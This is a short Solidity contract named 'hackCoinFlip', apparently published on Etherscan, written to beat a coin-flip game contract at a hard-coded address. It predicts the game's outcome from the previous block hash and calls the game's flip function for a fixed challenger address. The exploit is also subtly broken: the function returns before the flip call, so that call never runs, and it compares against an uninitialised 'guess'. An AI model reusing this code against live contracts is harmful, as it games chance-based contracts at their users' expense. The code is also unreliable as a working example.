/**
 *Submitted for verification at Etherscan.io on 2021-06-24
*/

pragma solidity ^0.8.0;

interface ImFeelingLucky { 
    function flip(bool guess, address challenger) external;
    }
 
contract hackCoinFlip {

    ImFeelingLucky lucky = ImFeelingLucky(0x72455d69e8474C43dB615e0e5FecBd2C43B3c5a8);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address challenger = 0xb0Cf03378907bAB550E97918bD2c286D6b4A36B1;
    
function hackFlip() public returns (bool guess) {
    
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip % 2 == 0 ? true : false;
    return(side);

    if (side == guess) {
        lucky.flip(guess,challenger);
    } else {
        lucky.flip(!guess, challenger);
    }
}
}